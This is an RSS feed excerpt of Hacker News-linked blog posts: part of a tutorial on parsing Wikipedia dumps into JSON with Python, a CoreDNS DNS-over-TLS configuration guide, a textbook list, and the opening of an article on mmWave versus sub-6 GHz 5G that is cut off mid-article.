<div><div><pre><code><span>def</span> <span>remove_double_curly</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>''</span><span>,</span> <span>''</span><span>,</span> <span>text</span><span>)</span> 
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>


<span>def</span> <span>remove_double_brackets</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>double_brackets</span> <span>=</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>'\[\[.*?\]\]'</span><span>,</span> <span>text</span><span>)</span>
        <span>for</span> <span>db</span> <span>in</span> <span>double_brackets</span><span>:</span>
            <span>if</span> <span>'|'</span> <span>in</span> <span>db</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>split</span><span>(</span><span>'|'</span><span>)[</span><span>-</span><span>1</span><span>].</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
            <span>else</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>strip</span><span>(</span><span>'['</span><span>).</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>
</code></pre></div></div>

<p>These functions worked-ish. You might notice the carat <code>^</code> in the curly function. This told it to match anything except another open curly bracket. This forced it to find the
innermost nested curly brackets. Again, this mostly worked, but it failed a few times and I gave up trying to figure out why. The square brackets are a bit different, as
they tend not to be nested but the inner syntax could be several different things. I opted for the simplest possible way and even so, it missed a few things. No idea why.</p>

<h2 id="attempt-15---literal-evals">Attempt 1.5 - Literal Evals</h2>

<p>I suppose I should rewind and give some context. Wikipedia dump files are effing huge. Even with 32GB of RAM on my desktop, I was rapidly running out of memory just 
loading one chunk at a time. So that meant I had to read each file line by line. Like so:</p>

<div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>file</span><span>,</span> <span>'r'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>infile</span><span>:</span>
    <span>for</span> <span>line</span> <span>in</span> <span>infile</span><span>:</span>
        <span>line</span> <span>=</span> <span>literal_eval</span><span>(</span><span>f'"""</span><span>{</span><span>line</span><span>}</span><span>"""'</span><span>)</span>  <span># this works... sometimes
</span>        <span>if</span> <span>'&lt;page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># new article
</span>            <span>article</span> <span>=</span> <span>''</span>
        <span>elif</span> <span>'&lt;/page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># end of article
</span>            <span>article</span> <span>+=</span> <span>line</span>
</code></pre></div></div>

<p>This works great for just reading the thing one at a time. One consistency in the Wikipedia dumps is that every page starts and ends with <code>&lt;page&gt;</code> and <code>&lt;/page&gt;</code> respectively.
This served as a great demarcation. So I tried to handle the unicode literals as they were coming in with <a href="https://www.kite.com/python/docs/ast.literal_eval">ast.literal_eval</a>. 
Spoiler: It worked. A little bit. This function frequently bombs out for various reasons.</p>

<h2 id="attempt-2---existing-parsers">Attempt 2 - Existing Parsers</h2>

<p>I finally gave up on manually parsing WikiMedia Text and found some extant parsers. First up is <a href="https://pypi.org/project/wikitextparser/">wikitextparser</a> which, as of this writing, is actively maintained.
Second up was the simple <a href="https://pypi.org/project/html2text/">html2text</a> which got some of the stuff the first missed. These premade parsers are great in that they 
don’t require me to use any of my own brain power! They are, however, far slower than my regex replace functions. It can’t be avoided, though.</p>

<p>So now my output looks more like this:</p>

<div><div><pre><code><span>[</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"4413617"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"The Samajtantrik Sramik Front is a national trade union federation in Bangladesh. It is affiliated with the World Federation of Trade Unions..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Samajtantrik Sramik Front"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"2618"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"Aeacus (; also spelled Eacus; Ancient Greek: </span><span>\u</span><span>0391</span><span>\u</span><span>1f30</span><span>\u</span><span>03b1</span><span>\u</span><span>03ba</span><span>\u</span><span>03cc</span><span>\u</span><span>03c2 Aiakos or Aiacos) was a mythological king of the island of Aegina..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Aeacus"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"3201"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"[[File:Global_Temperature_And_Forces.svg|thumb|upright=1.35|right|Observed temperature from NASA. vs the 1850</span><span>\u</span><span>20131900 average used by the IPCC as a pre- industrial baseline.. The primary driver for increased global temperatures in the industrial era is human activity, with natural forces adding variability. Figure 3.1 panel 2, Figure 3.3 panel 5.]] Attribution of recent climate change is the "</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Attribution of recent climate change"</span><span>
 </span><span>},</span><span>
</span><span>]</span><span>
</span></code></pre></div></div>

<p>It’s much cleaner and moving in the right direction but I still have to figure out the literal eval reliably and a few square brackets are making it through as well. 
These premade parsers are far slower but one advantage of cleaning up Wikipedia articles is that they end up far smaller without the markup. If you just want the accumulated 
knowledge in plain text format, it ends up being a fraction of the size.</p>



<p>I can tolerate a few aberrations here and there but the perfectionist in me wants to do better. Anyways, here’s my script as it stands today:</p>

<div><div><pre><code><span>import</span> <span>re</span>
<span>import</span> <span>os</span>
<span>import</span> <span>json</span>
<span>from</span> <span>uuid</span> <span>import</span> <span>uuid4</span>
<span>import</span> <span>gc</span>
<span>from</span> <span>html2text</span> <span>import</span> <span>html2text</span> <span>as</span> <span>htt</span>
<span>import</span> <span>wikitextparser</span> <span>as</span> <span>wtp</span>


<span>archive_dir</span> <span>=</span> <span>'d:/WikipediaArchive/'</span>
<span>dest_dir</span> <span>=</span> <span>'D:/enwiki20201020/'</span>
<span>chars_per_file</span> <span>=</span> <span>40</span> <span>*</span> <span>1000</span> <span>*</span> <span>1000</span>  <span># create a consistently sized chunk (~40MB each)
</span>

<span>def</span> <span>dewiki</span><span>(</span><span>text</span><span>):</span>
    <span>text</span> <span>=</span> <span>wtp</span><span>.</span><span>parse</span><span>(</span><span>text</span><span>).</span><span>plain_text</span><span>()</span>
    <span>text</span> <span>=</span> <span>htt</span><span>(</span><span>text</span><span>)</span>
    <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>)</span>
    <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>'\s+'</span><span>,</span> <span>' '</span><span>,</span> <span>text</span><span>)</span>
    <span>return</span> <span>text</span>
    

<span>def</span> <span>analyze_chunk</span><span>(</span><span>text</span><span>):</span>
    <span>try</span><span>:</span>
        <span>if</span> <span>'&lt;redirect title="'</span> <span>in</span> <span>text</span><span>:</span>  <span># this is not the main article
</span>            <span>return</span> <span>None</span>
        <span>else</span><span>:</span>
            <span>title</span> <span>=</span> <span>text</span><span>.</span><span>split</span><span>(</span><span>'&lt;title&gt;'</span><span>)[</span><span>1</span><span>].</span><span>split</span><span>(</span><span>'&lt;/title&gt;'</span><span>)[</span><span>0</span><span>]</span>
            <span>if</span> <span>':'</span> <span>in</span> <span>title</span><span>:</span>  <span># this is a talk, category, or other (not a real article)
</span>                <span>return</span> <span>None</span>
        <span>serial</span> <span>=</span> <span>text</span><span>.</span><span>split</span><span>(</span><span>'&lt;id&gt;'</span><span>)[</span><span>1</span><span>].</span><span>split</span><span>(</span><span>'&lt;/id&gt;'</span><span>)[</span><span>0</span><span>]</span>
        <span>content</span> <span>=</span> <span>text</span><span>.</span><span>split</span><span>(</span><span>'&lt;/text'</span><span>)[</span><span>0</span><span>].</span><span>split</span><span>(</span><span>'&lt;text'</span><span>)[</span><span>1</span><span>].</span><span>split</span><span>(</span><span>'&gt;'</span><span>,</span> <span>maxsplit</span><span>=</span><span>1</span><span>)[</span><span>1</span><span>]</span>
        <span>content</span> <span>=</span> <span>dewiki</span><span>(</span><span>content</span><span>)</span>
        <span>return</span> <span>{</span><span>'title'</span><span>:</span> <span>title</span><span>,</span> <span>'text'</span><span>:</span> <span>content</span><span>,</span> <span>'id'</span><span>:</span> <span>serial</span><span>}</span>
    <span>except</span><span>:</span>
        <span>return</span> <span>None</span>


<span>def</span> <span>save_data</span><span>(</span><span>data</span><span>):</span>
    <span>if</span> <span>len</span><span>(</span><span>data</span><span>)</span> <span>==</span> <span>0</span><span>:</span>
        <span>return</span>
    <span>filename</span> <span>=</span> <span>dest_dir</span> <span>+</span> <span>str</span><span>(</span><span>uuid4</span><span>())</span> <span>+</span> <span>'.json'</span>
    <span>print</span><span>(</span><span>'Saving:</span><span>\t</span><span>'</span><span>,</span> <span>filename</span><span>)</span>
    <span>with</span> <span>open</span><span>(</span><span>filename</span><span>,</span> <span>'w'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>outfile</span><span>:</span>
        <span>json</span><span>.</span><span>dump</span><span>(</span><span>data</span><span>,</span> <span>outfile</span><span>,</span> <span>sort_keys</span><span>=</span><span>True</span><span>,</span> <span>indent</span><span>=</span><span>1</span><span>)</span>


<span>def</span> <span>main</span><span>(</span><span>file</span><span>):</span>
    <span>print</span><span>(</span><span>file</span><span>)</span>
    <span>outdata</span> <span>=</span> <span>list</span><span>()</span>
    <span>article</span> <span>=</span> <span>''</span>
    <span>total_len</span> <span>=</span> <span>0</span>
    <span>with</span> <span>open</span><span>(</span><span>archive_dir</span> <span>+</span> <span>file</span><span>,</span> <span>'r'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>infile</span><span>:</span>
        <span>for</span> <span>line</span> <span>in</span> <span>infile</span><span>:</span>
            <span>if</span> <span>'&lt;page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># new article begins
</span>                <span>article</span> <span>=</span> <span>''</span>
            <span>elif</span> <span>'&lt;/page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># end of article
</span>                <span>doc</span> <span>=</span> <span>analyze_chunk</span><span>(</span><span>article</span><span>)</span>
                <span>if</span> <span>doc</span><span>:</span>
                    <span>outdata</span><span>.</span><span>append</span><span>(</span><span>doc</span><span>)</span>
                    <span>total_len</span> <span>+=</span> <span>len</span><span>(</span><span>doc</span><span>[</span><span>'text'</span><span>])</span>
                    <span>if</span> <span>total_len</span> <span>&gt;=</span> <span>chars_per_file</span><span>:</span>
                        <span>save_data</span><span>(</span><span>outdata</span><span>)</span>
                        <span>outdata</span> <span>=</span> <span>list</span><span>()</span>
                        <span>total_len</span> <span>=</span> <span>0</span>
            <span>else</span><span>:</span>
                <span>article</span> <span>+=</span> <span>line</span>
    <span>save_data</span><span>(</span><span>outdata</span><span>)</span>

    
<span>if</span> <span>__name__</span> <span>==</span> <span>'__main__'</span><span>:</span>
    <span>for</span> <span>file</span> <span>in</span> <span>os</span><span>.</span><span>listdir</span><span>(</span><span>archive_dir</span><span>):</span>
        <span>if</span> <span>'bz2'</span> <span>in</span> <span>file</span><span>:</span>
            <span>continue</span>
        <span>main</span><span>(</span><span>file</span><span>)</span>
        <span>gc</span><span>.</span><span>collect</span><span>()</span>
</code></pre></div></div>

<p>It’s not the most elegant solution but for just over 100 lines of code, it will parse almost all of Wikipedia and save it to 40MB chunks of JSON.
Running this script looks like the following:</p>

<div><div><pre><code><span>(</span>base<span>)</span> C:<span>\O</span>fflineWikipedia&gt;python jsonify_wikipedia.py</code></pre></div></div></section></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html">https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html</a></em></p>]]>
            </description>
            <link>https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25234490</guid>
            <pubDate>Sat, 28 Nov 2020 02:03:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure, Redundant DNS Using CoreDNS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25234382">thread link</a>) | @m_sahaf
<br/>
November 27, 2020 | https://www.caffeinatedwonders.com/2020/11/27/secure-dns-proxy/ | <a href="https://web.archive.org/web/*/https://www.caffeinatedwonders.com/2020/11/27/secure-dns-proxy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
        


    
    <p><time>November 27, 2020</time></p><div>
        <p>Although <a href="https://transparencyreport.google.com/https/overview?hl=en&amp;time_os_region=chrome-usage:1;series:time;groupby:os&amp;lu=load_os_region&amp;load_os_region=chrome-usage:1;series:page-load;groupby:os">an increasing portion of the web is adopting HTTPS</a>, a core part of the web infrastrcture lags behind in the form of plaintext DNS. The authentication problem of DNS is resolved by DNSSEC, but the queries are still plaintext. There’s currently a number of competing solutions that offer both authenticity and privacy concerns, namely DNS-over-TLS, DNS-over-HTTPS, and <a href="https://dnscrypt.info/">DNSCrypt</a>. I’ll leave it to Cloudflare’s blog to explain DNS, DoT and DoH, and the work towards both: <a href="https://blog.cloudflare.com/dns-encryption-explained/">DNS Encryption Explained</a>. Due to operating systems not yet supporting encrypted DNS resolvers, some work needs to be done by the user, and this post describes part of the work using <a href="https://coredns.io/">CoreDNS</a>.</p>
<p>CoreDNS is pluggable DNS and service discovery server written in Go and the blessed DNS resolver of Kubernetes. Configuring CoreDNS is handled via setting up a series of <a href="https://coredns.io/plugins/">middlewares</a> in the Corefile, which is what its config file is called. The <a href="https://coredns.io/manual/toc/">CoreDNS Manual</a> page does a brilliant job describing what CoreDNS is, how it works, how to install it, the structure of the configuration file, and more. To build our secure resolver, let’s pick up one of the examples off that page and gradually build the enhanced version.</p>
<p>Start by creating a file named <code>Corefile</code> containing the following, which is lifted verbatim from CoreDNS website:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.</span> <span>{</span>
    <span>forward</span> <span>.</span> <span>8</span><span>.8.8.8</span> <span>9</span><span>.9.9.9</span>
    <span>log</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>This is very simple, but let’s break it apart. The <code>.</code> means listen on port 53, the default port for UDP DNS, and across all interfaces. The configuration instructs CoreDNS to forward all requests to either <code>8.8.8.8</code> (Google DNS) or <code>9.9.9.9</code> (Quad9), picking either of them at random, and logs everything to stdout. This is not secure yet. This setup will forward all DNS queries in plaintext UDP packets. Let’s start by forwarding everything to <a href="https://developers.google.com/speed/public-dns/docs/dns-over-tls">Google DNS over TLS</a> resolvers without fallback:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.</span> <span>{</span>
    <span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span><span>
</span><span>		# This tells CoreDNS the subject name
</span><span>		# on the certificate is: dns.google
</span><span></span>		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
    <span>log</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>At this point the setup has redundancy against Google’s services only. What if Google DNS service is down? The possibiity of a service going down is not far fetched, and we must account for it. However, note how the <code>tls_servername</code> directive can only be defined once, so it is bound to whatever upstream IP address we’re using. We can get around this by breaking the upstream into more local resolvers. I’ll add Cloudflare DNS as backup:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.:53</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>127.0.0.1</span><span>:</span><span>5301</span> <span>127.0.0.1</span><span>:</span><span>5302</span> <span>[</span><span>::1</span><span>]</span><span>:5301</span> <span>[</span><span>::1</span><span>]</span><span>:5302</span>
	<span>log</span>
<span>}</span>
<span>.:5301</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span>
		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
<span>}</span>
<span>.:5302</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://1.1.1.1</span> <span>tls://1.0.0.1</span> <span>{</span>
		<span>tls_servername</span> <span>cloudflare-dns.com</span>
	<span>}</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Now we have established the pattern. To add more backups, add more server blocks where the upstream is defined and the respective <code>tls_servername</code> is configured, and add the localhost IP address to the main server of <code>.:53</code>. This can be further enhanced by adding caching, prefetching, and loading the <code>hosts</code> file. The final setup will look like this:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.:53</span> <span>{</span>
	<span>hosts</span> <span>/path/to/hosts</span> <span>{</span>
		<span>fallthrough</span>
	<span>}</span>
	<span>cache</span> <span>{</span>
		<span>prefetch</span> <span>2</span> <span>30m</span>
	<span>}</span>
	<span>forward</span> <span>.</span> <span>127.0.0.1</span><span>:</span><span>5301</span> <span>127.0.0.1</span><span>:</span><span>5302</span> <span>[</span><span>::1</span><span>]</span><span>:5301</span> <span>[</span><span>::1</span><span>]</span><span>:5302</span> <span>127.0.0.1</span><span>:</span><span>5303</span> <span>[</span><span>::1</span><span>]</span><span>:5303</span> <span>{</span>
		<span>policy</span> <span>random</span>
	<span>}</span>
<span>}</span>
<span>.:5301</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span>
		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
<span>}</span>
<span>.:5302</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://1.1.1.1</span> <span>tls://1.0.0.1</span> <span>{</span>
		<span>tls_servername</span> <span>cloudflare-dns.com</span>
	<span>}</span>
<span>}</span>
<span>.:5303</span> <span>{</span>
	<span>cache</span>
	<span>forward</span> <span>.</span> <span>tls://9.9.9.9</span> <span>{</span>
		<span>tls_servername</span> <span>dns.quad9.net</span>
	<span>}</span>
<span>}</span>

</code></pre></td></tr></tbody></table>
</div>
</div><p>Note that <code>policy</code> directive added in the first server block. Using <code>random</code> is superfluous because it is the default policy. The other policies available are <code>sequential</code> and <code>round_robin</code>. Regardless of the configured policy, CoreDNS will still perform health-checks and use a healthy upstream, so your queries are still answered even if one Google and/or Cloudflare are down. Configure your operating system to use your loopback address as the DNS server, set up CoreDNS service to start at boot, and your DNS queries are secure going forward.</p>

        
    </div>
    

    

    


        
        </div></div>]]>
            </description>
            <link>https://www.caffeinatedwonders.com/2020/11/27/secure-dns-proxy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25234382</guid>
            <pubDate>Sat, 28 Nov 2020 01:44:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Textbook Recommendations for Software Engineers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25234227">thread link</a>) | @victorbreder
<br/>
November 27, 2020 | https://breder.org/5/ | <a href="https://web.archive.org/web/*/https://breder.org/5/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>Here are my favorite books on Mathematics, Computer Science and Artificial Intelligence:</p>

<h2>Mathematics</h2>

<p><strong>Calculus, by James Stewart</strong> -- Derivatives and integrals for single-variable, multi-variable and vector functions. Also touches partial derivatives, differential equations and infinite series.</p>

<p><strong>Linear Algebra Done Right, by Sheldon Axler</strong> -- Real and complex vector spaces, linear transformations, eigenvalues and eigenvectors, inner product spaces, trace and determinants.</p>

<p><strong>Probability and Statistics, by Jay Devore</strong> -- Random variables, probability distributions, point estimation, statistical inference, regression and correlation.</p>


<h2>Computer Science</h2>

<p><strong>Introduction to Programming Using Java, by David Eck</strong> -- Also known as "JavaNotes". Variables and types, objects and classes, control flow, arrays, GUI programming, I/O, files, networking, threads.

</p><p><strong>The C Programming Language, by Kerninghan and Ritchie</strong> -- The classical K^&amp;R book on the ubiquitous C programming language. Variables, data types, control flow, functions, pointers, arrays.</p>

<p><strong>Introduction to Algorithms, by Thomas Cormen</strong> -- Algorithmic complexity, sorting, data structures, dynamic programming, divide-and-conquer, greedy algorithms, graph algorithms, string matching.</p>

<p><strong>Design Pattern, by Gamma</strong> -- The classical book on patterns for tackling recurring higher-level problems written by the "Gang of Four".</p>

<p><strong>Compilers, by Aho</strong> -- Another classic book, known as "The Purple Dragon Book", tackling the inner-workings of compilers.</p>


<h2>Artificial Intelligence</h2>

<p><strong>Artificial Intelligence, by Russel and Norvig</strong> -- A complete overview of the field of AI: Search, constraint satisfaction, logic, uncertain knowledge and reasoning, learning, natural language processing.</p>

<p><strong>Deep Learning, by Ian Goodfellow</strong> -- A complete reference for Machine Learning and Deep Learning: artificial neural networks, regularization, convolutional networks, recursive networks, auto-encoders, generative models.</p>


</div></div>]]>
            </description>
            <link>https://breder.org/5/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25234227</guid>
            <pubDate>Sat, 28 Nov 2020 01:16:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MmWave vs. Sub-6 GHz 5G – What’s the Difference?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25233982">thread link</a>) | @elephd
<br/>
November 27, 2020 | https://www.onesdr.com/2020/11/19/mmwave-vs-sub-6-ghz-5g-whats-the-difference/#more-1996 | <a href="https://web.archive.org/web/*/https://www.onesdr.com/2020/11/19/mmwave-vs-sub-6-ghz-5g-whats-the-difference/#more-1996">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>For the past few years we’ve been hearing about mmWave 5G and now, in 2020 it’s finally here! mmWave 5G promises amazing speeds of 10 Gigabits/second, very low latency of around 1 millisecond, and many other amazing features. It currently operates in the frequency range between 24 GHz and 40 GHz. </p>



<p>Verizon has deployed this technology in many major cities across the USA. Here is a map that shows Verizon’s mmWave or <a rel="noreferrer noopener" href="https://www.verizon.com/about/news/fastest-5g-network-world-just-got-bigger-and-better" target="_blank">Ultra Wideband 5G</a> deployments.  </p>







<figure><img loading="lazy" width="1024" height="399" src="https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1024x399.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1024x399.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-300x117.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-768x299.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1536x598.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G.png 2031w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>mmWave 5G or 5G Ultra Wideband deployments in USA</figcaption></figure>



<p>While mmWave 5G deployments have been limited to date, they will grow over time. Verizon will also be deploying Sub-6 GHz 5G networks this year. As the name suggests these networks will be deployed at frequencies below 6 GHz. </p>



<p>In 2020 we have also seen many new 5G phones – some of which <a href="https://amzn.to/3ffJ30C">support mmWave</a> and <a href="https://amzn.to/3923Cwy">others that don’t</a>.</p>



<h4><strong>The biggest differences between mmWave 5G and all other wireless systems</strong></h4>



<p>As the name suggests, mmWave 5G operates at mmWave frequencies starting at 24 GHz. Why do we need to move to mmWave frequencies? To support higher upload and download speeds we need more bandwidth. A single channel of mmWave 5G can be 400 MHz wide. That large amount of contiguous bandwidth is simply not available at lower frequencies as almost all the spectrum has already been allocated for other applications. </p>



<p>The picture below shows the bandwidth of 5G systems relative to other cellular technologies. </p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-1024x236.png" alt="" width="690" height="159" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-1024x236.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-300x69.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-768x177.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths.png 1446w" sizes="(max-width: 690px) 100vw, 690px"><figcaption>Bandwidths of cellular technologies</figcaption></figure></div>



<p>The maximum bandwidth of 5G is 20 times larger than the maximum bandwidth of a 4G signal. That makes sense when you compare the theoretical maximum achievable speed of a 4G network at 300 Mbps with that of a 5G network at 10,000 Mbps.  </p>



<h4><strong><span>Let’s now take a look at some of the major RF related challenges with mmWave 5G relative to previous generations of wireless systems</span></strong></h4>



<h3><strong>Radio Signals in the Real World</strong></h3>



<p>To put things in context, we have never operated our cellular communication systems at mmWave frequencies. The highest we have operated at is around 2 GHz for 4G systems and 6 GHz for Wi-Fi systems.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1024x576.png" alt="" width="669" height="376" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges.png 1600w" sizes="(max-width: 669px) 100vw, 669px"><figcaption>Frequency ranges for different wireless technologies</figcaption></figure></div>



<p>The only wireless systems we have implemented at mmWave frequencies are point-to-point, line-of-sight links. We will, for the first time ever, have to deal with operating in challenging mmWave RF environments. </p>



<p>What does that mean?</p>



<p>mmWave signals don’t propagate very far. They are in fact obstructed by even the smallest of objects on account of their small wavelength. Trees, buildings, moisture – all affect mmWave signal propagation. As a result, cities and suburbs are very challenging environments from a mmWave perspective. </p>



<div><figure><img loading="lazy" width="1024" height="576" src="https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1024x576.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Things that affect mmWave 5G signals</figcaption></figure></div>



<p>So how do we propose to solve the problem? The plan is to deploy about five times as many 5G base stations as with 4G and to use a technology called beamforming. As the name suggests this focuses RF energy beams in specific directions – toward users in particular. </p>



<p>However there still remains the fact that we have a relatively poor understanding of how exactly RF behaves at these frequencies in city environments where things change fast. Buildings and other structures appear relatively quickly and sometimes unexpectedly. The behavior of RF signals will then change accordingly and often unpredictably.</p>



<p>Unlike with previous systems operating at 2 GHz, we have not had the benefit of four decades of research and development. We have barely had two years to develop an understanding of how mmWave will work.</p>



<h3><strong>Complex Phone Development</strong></h3>



<p>The average phone today has multiple wireless sub-systems operating in it. Everything from 2G to 4G with Wi-Fi, Bluetooth, NFC and sometimes even FM. In small cell phone dimensions this is potentially chaos from an RF standpoint with signals interfering with one another. Increased power consumption of mmWave components is another significant issue as it results in more heat dissipation and lower battery life.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards.png" alt="" width="332" height="373" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards.png 703w, https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards-267x300.png 267w" sizes="(max-width: 332px) 100vw, 332px"><figcaption>Different wireless technologies in a phone today</figcaption></figure></div>



<h3><strong>Higher Build and Development Costs</strong></h3>



